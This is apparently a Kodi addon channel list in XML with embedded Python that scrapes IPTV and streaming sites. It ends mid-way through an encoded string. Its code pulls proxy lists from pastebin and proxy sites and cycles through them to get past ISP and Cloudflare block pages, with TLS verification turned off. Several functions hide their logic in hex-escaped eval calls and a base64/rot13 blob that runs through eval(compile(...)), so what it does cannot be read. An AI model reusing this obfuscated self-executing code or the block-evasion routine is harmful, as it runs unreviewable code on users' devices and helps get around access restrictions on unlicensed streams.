<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'https://www.blogdepelis.tv/'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
$doregex[reparar_proxies]
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>reparar_proxies</name>
<expres><![CDATA[#$pyFunction
import requests,six
def GetLSProData(page_data,Cookie_Jar,m):
    #oficial https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/proxieshttps://pastebin.com/raw/GDkjkYh6
    pasta = requests.get('https://pastebin.com/raw/GDkjkYh6', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>link_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six,re,requests
from resolveurl.plugins.lib import jsunpack
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    if 'adictosalatele' in url:
      path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
      f = open(path, 'r')
      html = f.read()
      f.close()
      iframe = re.findall('(?s)iframe.*?src=[\'"]([^\'"]+)', html)[0]
      html1 = requests.get(iframe, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': url}, verify=False).text
      html1 = six.ensure_str(html1)
      try:
          url2 = re.findall('source.*?[\'"](.*?m3u8.*?)[\'"]', html1)[0]
      except:
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', html1)[0]
          unpack=jsunpack.unpack(pack)
          url2 = re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)"', unpack)[0] + '|Referer=' + url
      return url2
    elif 'f4m=' in url:
      url = url[4:]
      return '/?streamtype=HLSRETRY&url='+url
      #+ url
    else:
      return url
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>plugin</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if 'f4m=' in url:
    return 'plugin://plugin.video.f4mTester'
  else:
    return ''
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Z2uD47a.jpg</thumbnail>  
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
 </item>
















<item>
<title>[COLOR lightgreen][COLOR white]Ultima proxy prueba  Py3[/COLOR]</title>
<link>$doregex[plugin]$doregex[link_inteligente]</link>
<regex>
<name>prueba_proxi</name>
<expres><![CDATA[#$pyFunction
url = 'Directo=http://83.32.27.231:8001/1:0:1:7478:3F0:1:C00000:0:0:0:'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'http://cdn.sportcast.life/webplayer.php?t=ifr&c=1574935&lang=en&eid=1049841&lid=1574935&ci=215&si=3'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,header=header):

 if not 'http' in url or 'f4m=' in url or 'Directo=' in url:
  return url
 else:
  try:
      web_proxy_1 = requests.get('https://api.proxyscrape.com/?request=displayproxies', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_1 = six.ensure_str(web_proxy_1)
      web_proxy1 = re.findall('(\d+.*?:\d+)', web_proxy_1)
  except:
      web_proxy1 = ""
  try:
      web_proxy_2 = requests.get('https://api.chrxw.com/proxy/get_all', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_2 = six.ensure_str(web_proxy_2)
      web_proxy2 = re.findall('(\d+.*?:\d+)', web_proxy_2)
  except:
      web_proxy2 = ""
  try:
      fecha_final = datetime.today().strftime("20%y%m%d")
      dias = str(datetime.fromtimestamp(time.mktime(time.strptime(fecha_final, "%Y%m%d"))) + timedelta(days=-1))
      fecha_nueva = 'https://proxysource.org/en/freeproxies/' + dias[:10]
      proxy_source_response = requests.get(fecha_nueva, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      proxy_source_response = six.ensure_str(proxy_source_response)
      proxy_source_items = re.findall('[,\[]"(\d+.*?:\d+)"', proxy_source_response)
      web_proxy_source = []
      for item in proxy_source_items:
          if item not in web_proxy_source:
              web_proxy_source.append(item)
  except:
      web_proxy_source = ""
  try:
      web_hidemi_response = requests.get('https://hidemy.name/es/proxy-list/?maxtime=1000&type=h#list', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      web_hidemi_response = six.ensure_str(web_hidemi_response)
      web_hidemi_items = re.findall('</td></tr><tr><td>(.*?)<.*?(\d+)</td><td><i', web_hidemi_response)
      web_hidemi = []
      for item in web_hidemi_items:
          proxy_integrado = item[0] + ':' + item[1]
          web_hidemi += [proxy_integrado]
  except:
      web_hidemi = ""
  try:
      response = requests.get('https://proxyranker.com/japan#', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}, verify=False).text
      response = six.ensure_str(response)
      japon_items = re.findall('<tr><td>(.*?)<.*?port">(.*?)<', response)
      web_japon = []
      for item in japon_items:
          proxy_integrado = item[0] + ':' + item[1]
          web_japon += [proxy_integrado]
  except:
      web_japon = ""
  try:
      web_proxy_nuestra_1 = requests.get('https://pastebin.com/raw/Wa13VCMA', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://cricfree.stream/home'}, verify=False).text
      web_proxy_nuestra_1 = six.ensure_str(web_proxy_nuestra_1)
      web_proxy_nuestra = re.findall('(\d+.*?:\d+)', web_proxy_nuestra_1)
  except:
      web_proxy_nuestra = ""
  try:
      proxy = web_proxy_nuestra + web_proxy_source + web_hidemi + web_proxy2 + web_proxy1 + web_japon
      Archivo = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
      open(Archivo + 'cambio.txt','wb').write(six.ensure_binary('web_proxy_nuestra='+str(len(web_proxy_nuestra))+'_'+'web_proxy_source='+str(len(web_proxy_source))+'_'+'web_hidemi='+str(len(web_hidemi))+'_'+'web_proxy2='+str(len(web_proxy2))+'_'+'web_proxy1='+str(len(web_proxy1))+'_'+'web_japon='+str(len(web_japon))+'_'))
  except:
      proxy = []
  path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
  try:
      f = open(path, 'r')
      key = f.read()
      f.close()
      full = re.findall('Proxi Utilizado=(.*?)_', key)[0]
      proxy.insert(0, full)
  except:
      pass
  contador = 0
  try:
      html = requests.get(url, headers=header, verify=False).text
      html = six.ensure_str(html)
      try:
          html = re.findall('(Contenido bloqueado|Required! \| Cloudflare|Por causas ajenas a Vodafone|<html><body>Object not found</body></html>)', html)[0]
      except:
          html = html
          proxi = 'No Proxies'
  except:
      html = 'Contenido bloqueado'
  while 'Contenido bloqueado' in html or 'Required! | Cloudflare' in html or 'Por causas ajenas a Vodafone' in html or '<html><body>Object not found</body></html>' == html:
      try:
          xbmc.executebuiltin(("Notification([COLOR white]Usando Proxi %s de %s[/COLOR],[COLOR white]Intentando saltar bloqueo[/COLOR], 5000)")%(contador+1, len(proxy)))
          html = requests.get(url, headers=header, proxies={"https": "http://"+proxy[contador]}, verify=False, timeout=10).text
          html = six.ensure_str(html)
          proxi = proxy[contador]
          try:
              html = re.findall('(Contenido bloqueado|Required! \| Cloudflare|Por causas ajenas a Vodafone|<html><body>Object not found</body></html>)', html)[0]
              contador += 1
          except:
              html = html
              xbmc.executebuiltin(("Notification([COLOR white]Proxi %s[/COLOR],[COLOR white]Logrado saltar bloqueo!![/COLOR], 8000)")%(proxi.replace('1', '3').replace('5', '1').replace('2', '5').replace('3', '7').replace('9', '0')))
      except:
          html = 'Contenido bloqueado'
          contador += 1  
      if len(proxy) == 0:
          xbmc.executebuiltin("Notification([COLOR white]Usa VPN No hemos[/COLOR],[COLOR white]Conseguido Proxies!![/COLOR], 8000)")
          return ''
      elif len(proxy) == contador:
          xbmc.executebuiltin(("Notification([COLOR white]Usa VPN Despues de probar %s[/COLOR],[COLOR white]Proxy No hemos saltado bloqueo!![/COLOR], 8000)")%(contador))
          return ''
  ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
  open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary('Proxi Utilizado='+proxi+'_'+str(contador)+html))
  return url
]]></expres>
<page></page>
<cookiejar></cookiejar>
</regex>
<regex>
<name>link_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six,re,requests
from resolveurl.plugins.lib import jsunpack
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cLrJIhsDApL
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    if 'adictosalatele' in url:
      path = TRANSLATEPATH("special://home/addons/plugin.video.cristalazul/html.txt")
      f = open(path, 'r')
      html = f.read()
      f.close()
      iframe = re.findall('(?s)iframe.*?src=[\'"]([^\'"]+)', html)[0]
      html1 = requests.get(iframe, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': url}, verify=False).text
      try:
          url2 = re.findall('source.*?[\'"](.*?m3u8.*?)[\'"]', html1)[0]
      except:
          pack = re.findall('(eval\(function\(p,a,c,k,e,d.*)', html1)[0]
          unpack=jsunpack.unpack(pack)
          url2 = re.findall('Clappr.Player[\w\W]*?(?:source|src):\s*[\'"]([^\'"]+)"', unpack)[0] + '|Referer=' + url
      return url2
    elif 'f4m=' in url:
      url = url[4:]
      return '/?' + url
    elif 'Directo=' in url:
      url = url[8:]
      return url
    else:
      return url
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>plugin</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
import re,requests,xbmc
def GetLSProData(page_data,Cookie_Jar,m,url=url):#cPrLItsLTfakl
 
  if 'f4m=' in url:
    return 'plugin://plugin.video.f4mTester'
  else:
    return ''
]]></expres>
<page></page>
</regex>
</item>










<item> 
<title>[COLOR orangered]ss Chikiry_Cristal [COLOR white]Channels_Spain The Cat[/COLOR]</title> 
<link>$doregex[makelist]</link> 
<regex> 
<name>makelist</name> 
<listrepeat><![CDATA[ 
<title>[COLOR orangered] Lista [makelist.param1][/COLOR]</title> 
<link>$doregex[makelist2]</link> 
<thumbnail>https://i.imgur.com/Z2uD47a.jpg</thumbnail> 
<fanart>https://i.imgur.com/fp05txz.jpg</fanart> 
]]></listrepeat> 
<expres><![CDATA[#$pyFunction 
import re 
def GetLSProData(page_data,Cookie_Jar,m): 
  lastpg=re.findall('data-ci-pagination-page="(\d+)"><i\s*class',page_data)[0] 
  return [(str(pages),) for pages in range(1,int(lastpg)+1)] 
]]></expres> 
<page>https://iptvcat.com/spain_-/</page> 
</regex> 
<regex> 
<name>makelist2</name> 
<listrepeat><![CDATA[ 
<title>[COLOR white][makelist2.param1] [/COLOR] [makelist2.param2]</title> 
<link>plugin://plugin.video.f4mTester/?streamtype=TSDOWNLOADER&amp;name=ChikiryCristal Tv&amp;url=[makelist2.param3]?OPT:http-reconnect=true</link> 
<thumbnail>https://i.imgur.com/Z2uD47a.jpg</thumbnail> 
<fanart>https://i.imgur.com/fp05txz.jpg</fanart> 
]]></listrepeat> 
<expres><![CDATA[#$pyFunction
url = '[makelist.param1]'
import requests,re,six
def GetLSProData(page_data,Cookie_Jar,m,url=url): 
  response = requests.get('https://iptvcat.com/spain_-/'+url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0', 'Referer': 'https://iptvcat.com/'}, timeout=10, verify=False).text
  response = six.ensure_str(response)
  items = re.findall('(?s)div>" title="(.*?)".*?green.*?title=".*?".*?state (.*?)".*?.+?data-clipboard-text="(.*?)"', response)
  videos = []
  for item in items:
    if 'CAZA' in item[0] or 'TORO' in item[0] or 'offline' in item[1]:
        item0 = ''
    else:
        item0 = item[0]
        item1 = item[1].replace('online','[COLOR green]ON[/COLOR]').replace('offline','[COLOR red]OFF[/COLOR]')
        url = item[2]
        videos += [(item0, item1, url)]
  return videos
]]></expres> 
<page></page> 
</regex> 
<thumbnail>https://i.imgur.com/RRMufBH.png</thumbnail> 
<fanart>https://i.imgur.com/fp05txz.jpg</fanart>
</item>












<item>
<title>[COLOR lightskyblue]Estable [COLOR orangered]Chikiry_Cristal TV HD[/COLOR]</title>
<link>$doregex[A]</link>
<regex>
<name>A</name>
<listrepeat><![CDATA[
<title>[A.param1]</title>
<thumbnail>[A.param3]</thumbnail>
<fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
<link>$doregex[busca]</link>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data, Cookie_Jar, m):
    items = [('[COLOR gold]** [/COLOR][COLOR white]INFORMACION IMPORTANTE[COLOR gold] **[/COLOR]', 'informacion', 'https://i.imgur.com/Z2uD47a.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DEPORTES[/COLOR]', 'deportes', 'https://i.imgur.com/ZcG5Wvu.jpg'), ('[COLOR orangered]+ [COLOR white]TV PREMIUM[/COLOR]', 'tvpremium', 'https://i.imgur.com/AhCogTD.jpg'), ('[COLOR orangered]+ [COLOR white]TDT[/COLOR]', 'tdt', 'https://i.imgur.com/Zu3ZtDQ.jpg'), ('[COLOR orangered]+ [COLOR white]TV INFANTIL[/COLOR]', 'infantil', 'https://i.imgur.com/7iGElA4.jpg'), ('[COLOR orangered]+ [COLOR white]CANALES DE DOCUMENTALES[/COLOR]', 'documentales', 'https://i.imgur.com/hzBiiWJ.jpg'), ('[COLOR orangered]+ [COLOR white]TAQUILLAS[/COLOR]', 'taquilla', 'https://i.imgur.com/gfpSeHc.jpg'), ('[COLOR orangered]+ [COLOR white]LATINOS[/COLOR]', 'latino', 'https://i.imgur.com/8nIpSn3.jpg')]
    return items
]]></expres>
<page></page>
<agent></agent>
</regex>
<regex>
<name>busca</name>
<listrepeat><![CDATA[
<title>[COLOR white][busca.param1][/COLOR]</title>
<link>$doregex[plugin]$doregex[link_inteligente]</link>
<thumbnail>[busca.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
elegir = '[A.param2]'
import re,requests,base64,shutil
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
import base64, codecs

morpheus = ''
trinity =  ''
oracle = ''
keymaker = ''
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

]]></expres>
<page></page>
</regex>
<regex>
<name>emitiendo</name>
<expres><![CDATA[(?s)[makelist2.param4].*?ahora">\s*(.*?)<]]></expres>
<page>http://www.formulatv.com/programacion/movistarplus/</page>
</regex>
<regex>
<name>prueba_proxi</name>
<expres><![CDATA[#$pyFunction
url = '[busca.param3]'
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Referer': 'https://www.blogdepelis.tv/'}
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
$doregex[reparar_proxies]
]]></expres>
<page></page>
<cookieJar></cookieJar>
</regex>
<regex>
<name>reparar_proxies</name>
<expres><![CDATA[#$pyFunction
import requests,six
def GetLSProData(page_data,Cookie_Jar,m):
    #oficial https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/proxieshttps://pastebin.com/raw/GDkjkYh6
    pasta = requests.get('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/proxies', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>link_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[prueba_proxi]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import six,re,requests
from resolveurl.plugins.lib import jsunpack
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDY1NzQ3NTRmNmYzMDcxMzIzNzY2NzYzNjY5NzY1NjU3MzM1NDcxNzQ0YzUzMzY2ZDY1NmM2ZTYxNjY2MTUyNzc2NzUzNDU3NzU5NTM2MzU4NTgzMDQ0MzkzNDcxNTM2MzU0NmY0Zjc4NDk1NDc1NjQ0MjcyMzUyYjZhNzg0ODRmNzE2YzcxMzkzMTU0NzA1MDM1Mzg0NTY5Njc1OTY3NWEzODdhNGE2OTdhNzA2OTQ0NTA0NDU4NzQzOTY1MzMzOTM5MmI2NjM5NzY3NzM1NjY0YTMzMmYzNzc2NjI3ODJiNTAzNTU0MmYyYjc1MzIzMzM1NzY3MjU3NzY2ODM1NzUyZjJmNzIzOTQ4MzczOTJmMzI1NzJmNGUyYjM3NGQ2NDQ3NzQ0OTUwNTgzMDc0NzI2MjUzMzIyZjMzNTkyYjQ4NzA2ZDJmN2EzMDJmMzI1OTU3Mzk0ZjM2MzI0MzM3NDgzNjRlNzY3Mzc0NGUzODM2NjU0YzM5NzMzOTJiNmUzOTU3NDY3MjZlNzk2MjY0NmEyYjM0MzUzNTM5MzczMjJmNGQ2Mzc0NDI1NDRmNTUzMzc2NGQzMjUzMzEyYjU2NTkzMjMwNzQzMzYyNTMzOTM5MmY0ZTdhNTM1NjQ3NGU3MzM1MzE2Yzc1NGM3YTRlNmM0YzYxNzY2MzU2NDkzMjMwNmM3ODU4MmIzOTZlNmQ2NjMxNGQ3NTczNGU2YzUzNTc2YTM3Nzg2NjVhNjY2ZDc3NjQ0Nzc0Mzc2YzYzNTc1NDVhNTY1OTYxNzE2OTcyNGY1MzM5NjM3YTZjMzIzNTUyMzYyZjZiNzUzMzM2MmI3NDZmNmM2ZjUwNjE2OTdhNGU1NjU2NjI2OTMzNTI3MTJmMzI0Njc5NGY3NTYzMzE2ZTc5Mzc0NTYzNGQ2MjM1NjE0ZTc0NGE1NTQ2NjM1YTU4NGQ2NjU3NDE2MjZlNGE2MzVhNmE2ZTQ4NmE1NzcyNDU2NTM5MmI3YTU2MzYzNjM2NGMzNjc1MzE3NDU4NGM3YTQ4NmE0YjZmNmUzNzQ2NzM2MzZkNTA2YzcyNmU3NjU5NTk1Mzc5NzI3YTYxNzU2NTM0MzU2MTUxNjY1NDUxNzgzOTZkNDc0ODcxMmI3YTZjNGI0NTY1NTY1OTYxMzM0Nzc3Mzc0ZjYzMzk3NTQyNjU1OTU5MzM2YTZiNDY2NTM0N2EzNDM2NTk0NTdhNjE3NzQ2MzMzODcyNzk0YTRmNTc0NzY5NDYyZjM1NTA1MDYzNzc2NjRlNzg3ODU4NmM2MTM3MmI0YzMxNDk1NzYzMzk1NzU0NjE0OTY3NTk3NjcyNzk1MDY1NjM1NDMxNmU3MjRmMmIzNzRlNmM2Mjc0MzU1NjUyNzk2NjRiNjEzNTcwNzEyYjcyMzc0YjMzNzg2OTQ2NGE0MzZhMzk0ODc2MzQ2NTU2NTQ2MTQyMzU0Mjc2Nzc0MjM4NTQ3MDY1MmI3ODY2NzE1MDMxNDczNTVhNWE1MDQzMzYzMTQ4Njc0YTc5NzkzODZkNzk0ZjZmMzc0YjRjNjY0NTY1NjM1MjZjNzA3MTdhNjY0MTc2MzM2OTY2MzAzMDM3NGQzOTYxN2E0MzU0NTc2ZjMxMzE3MDYxNjk0ODZhMzc2OTU1NjQ0ODUwNGY3MzM3NGY0ZDY4NGU1OTQ2MzM0NzcxNDY1MDUyNTk3NzM5MmI0OTcwNTY3NjQzNjQ3ODRjN2E3NTQ5MzU2ZTUxNDgyZjYxNjE1MzZmMzM3MTVhNWE1NjZhNTM3NTc4NTU1OTJiNGIyZjcxNTM2NDM5NDgzMzZkNTU2MjM3NDQ3NTU4NmQ1NzRlNDY2NzQ4MzEzMzRjNTE3YTMzNTczODZmNTI1MDZlNWE2MjQ3Njg1OTMxN2E1NjU2NmYzNjJmNTk1MjU4Njk2OTQ4NmQyYjQxNzQ2MTM0NjI2ZDMwNzU3MzM2NGM1MjM2MzE2MzZjNzg2ODRkNDg3NDRjNzMzMjU2Njg2ZTZhNmQ2ODRkMmYzODQ0NmU3MzcxNjg0MjMzMmI0MjMzNzI2ZTY1Njg0ODcyNGYzMTY3NDg1Njc2NmE2ZjJiNDY2MTcwNTE0ZDM3NDk1NDY1NzA2NzQ3NGQ3MjQ4MmI2ZDc2MzI3NDRhMzY1MTMyNWE2NTUwNTg0MTRiNjU1NjY4NTQ0MTZhNjQ1OTdhMzE2MzMyMzc0NDc3NDI1MjM4NDE3YTM0NzU3MDRiNmE0OTUwMzk2NjY3MzU2Mzc3N2E2NTZhNGQ0OTQ2MzM3ODRiNTU2MzRlNjUzNDM0NDQyZjY0NjM1NDM4NjU3Njc3NjEzOTYxNGYzOTc3MzM3NzQyNjY2OTY1NmY1MzY1Mzg0NTJmNmE3NzYzMmY3NzQ4MmY1NzczNGQ0YTM2NTk1YTJmNzkzNTdhMzg2MTMxNzg2OTJmNzc0NDQ2MzI1NjZiNTkyYjQ5NjczMDc1MzczNDU1NjY1ODczNzgzNzc4NzE1MjJmNTk3MDU5MmY2MzZkNDgzNTQ1NDg1MDQxNjI0NzUzMmY3MzUxMzU2MzM0NmE1MjM5Nzg3YTY0NTQ2YjY3NTgyZjc0NjM3OTUwNTg0ZDUzNTUzMjY5NzQ0ZjUzNjU3OTM2NGMzNDYzMzg2YTM5NjkzMzU3N2E2MjUxNzMzNDQ2Mzc0ODQ3MzM0NzUyNzc0MTQ4Mzk3MjJiMzE3YTY5NTA3MzU2NjM2NTVhNmE2YTQ5NzY1OTQ5NjUzNjUxNmEzNzY4Nzg0Yzc5NmYyYjc3MzU3YTU5MzQ1ODc0NDY2ZTRjNzE0OTRmMzI0YjRiMzk2MjY3NzY2ODMyNTg0NDRmNTQ0ODM4NDI1YTc5NGY0ZDY0MzQ2NjM0NTU1MDQ1NDczMzczMzczNTMzMzUzMTYxMzY3OTRjMzUzODc3NmU0NzY2NDI0YjZlMzE1NzRkNmYzODY0Mzg1OTY0NGUyYjcyNjc2NjM1NmEzMjc1NDc0ZjQ2NjI0NjRiMmY1OTU2Mzc0OTRlMmY3NDQ0MzM3MjZiNjI2MTcxNjk2YTcyNDE1MDc4NmUzODJiNzM0MTY0MzU0NTQ0NjY0YjZkNDUyYjQ5NjUzNTRkNmE1MzRmMzk1MDMzNTA2OTY5NjIzNDQ4NTQ2ZjZkNDg0NTZlNjg0NTJmNjc1MDU3NGQ2NTM4NGY2NjY1NDU2NjMyNmM2Yjc5NzY3MjYyNDc1ODU1NjIzOTYzMmI0MzRlNGY0ZjUxMzYzODQxNDgzODZkNGU0ZjY1NzM1NzU0MmI2NzM1MzU3MjZmMzM0MzRhNGQyZjY3N2E0MTM1MzY3MTQ3NDg0NTQ4N2E2ZTUzNjU1OTZhNzg3MjZhNDk0ZDc0NmYzODM1NDQyZjQyNmQzMDZjMmY0YzMwMmI0NTYyNzEyZjU5NjgzODc3NGM1NzY4NGYyZjQ4NDkzNTM5Njk0ODZmMmY1OTZhNjM0MTYyMzc0NzZiNTU2Mzc3NTQzOTQ4NmU1MjRlNzA0NjJmNzc0ZDc2MzM3MjRkNzE3NzM3Nzg0MTdhNzc0MjUyNzk1Njc4NDQ3NjZjNzIzNzZmNGY2MTYzNjQ0ODcyNWE2NDY4MmY3MzRhNmUzNjYxNTM3NzY4NTA3NzRhNzY3NzRhNmQ2ZTM4N2E2ZTU3NzQ2YTM3NmM0ZDM2MzczMDQ0MmY0MzRkNjU0NzYyNGQ0ZDM4Nzg3YTczNDY1ODZhNmE0YzM0NDQ2ZTZlN2E2OTQ3Mzc2YTc4MzY1NjYzMzg3ODJmNzI3NzcwNTU0NTM4NGI3NTVhNzc3MjZiNTYzODU5NWEzODZmMmI3MzRmNTY2ZjM3NWE3NjVhNTAzMTQxNmU3MTUxMmY2ZDU1NjU0MjRmMzY3NzMzMzA1NDZjNWEzNDM2NTc0NzJmNzM2YTdhNGM3NjMwNDkyZjQxNGI1MDczNGI2NTQ4NjYzMTZjNmU0NDRmNDE0MTM4NTc0MjJiNDI2ZDM2MzQ1MDdhNTA1MDMxNDg2YjU2NjY3Mzc5NWE0YzMzMzI3MDM5Nzk1MDczNGQ0YzU0NjY2ZDQ1MmIzNDQyMmI0NTc2NzY0ODY0NTk2MzM1NDM0ODZiNGEyYjQ5NTkyYjM3MmY3YTJmNmEzNjQ4NmU0ODRlNzU2ZjRlNzg2ZDQ1NjMzODZhNGI3NzZhNGY2NjUzNDY2ZTc4NDM0ODRhNjM2NTM1Mzk0MjU4MzM2ODc1NGEyYjY0NDg1NDJiNzE0OTQyMzU1ODRiNmU2NjYzNzM3NDM4N2E1MDZhNmM3NTQ1NGE1MDM2NzU2Mzc5NTA2YjY2NTU0MjJiNGE0ZTQ3NGM3MTRmNzU0NDcwNmU0N'
trinity =  'GZkAGN0ZGH5AwRmAmZmAwV3ZmD2Zmx1ZQWvATVmBGp5Amt2MwH0AGHmBGWvATR3LGMxZzV1AGEyZmR0BGEzZmD3AGMwZmp2LmpkZmp1ZQZlATL0MQplZmR3AQEwATV1BGWzZmL0AmD4AmZ3BQLlZmZ0ZmL1AGZ2Awp0AGZ3BGL3AwH2AGZ3AQt3ZGL2AzR3BQMxAwL2BQL5AGD2AmMzATV3ZQZjAwL1AmH3AwL2BQEwZmDmZmWzAwx1LGH5ZzLmBQMwZmp3ZQWzAQH2LmZ4ZmD3ZmplZmL3BQL2A2R0BQL1AzD2MwZ5AwZ0AGWvZzL2MwLmZmLmAwMuAQDlMwplAwx1ZGEwZzV3AwplZmx3ZGH4ZmZ0BQWzZzV2LGD4Amx0LwWzZmR3LGHlAQZmAwD1AwL2Mwp4ZzL3BQL2AzR3BGH4ATD0AQZ5A2R2MGL4Amt2MGZjAzZ2ZwZ1ZmZ2LmWzAGN1AmpkZzLmAQH5Amx3BQZjAzH1AmL2AwH0MGEwZmH2LwquAwp2MQpjAzZ2AmL2ATRmBQHmAmD3BQMwAQt0AwMxAmZmZQZ4AQR3LGpmAmV2ZwHlAwL2BGp5AGD0MQD2ZmHmBGD1ZzV3BGL2AmR2LmZ4AwVmZmD1AmL1BGD5ZzL2MQL2ATL2BQp4Amx0MQL2AGp3BQZ3AzHmAwZmAmx0ZGL1AmZ0LwZ4AJR0MwpmZmL1AGZ3AQH2MQEuZzL1ZGL2Zmp0MwH2ZmH1ZGp4ATZlMwL1ATVmBGH5AmN3AmZmAwx2ZGExAzVmAwZ5ZzV1AmZmZmxmAmL2AGDmAGL2AGRlLwZ0AQD1AQZlZzV3BQL1ZzL2ZwZ4AGZmBGpkAQH1ZwLmAGp0ZmD5ATL0AQDlAQpmAmL0AmD0AGH1AmD2ZmL3AGZ1ZGWzAzR2ZwD1A